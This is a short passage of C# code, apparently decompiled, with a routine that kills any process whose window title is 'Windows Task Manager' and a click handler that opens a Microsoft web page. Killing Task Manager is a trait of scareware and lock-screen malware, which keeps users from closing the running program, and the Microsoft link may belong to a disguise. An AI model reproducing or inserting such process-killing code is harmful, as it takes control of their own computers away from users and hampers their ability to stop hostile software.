			if (Operators.CompareString(process.MainWindowTitle, "Windows Task Manager", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void PictureBox6_Click(object sender, EventArgs e)
	{
		Process.Start("https://www.microsoft.com/en-in/");
	}
}
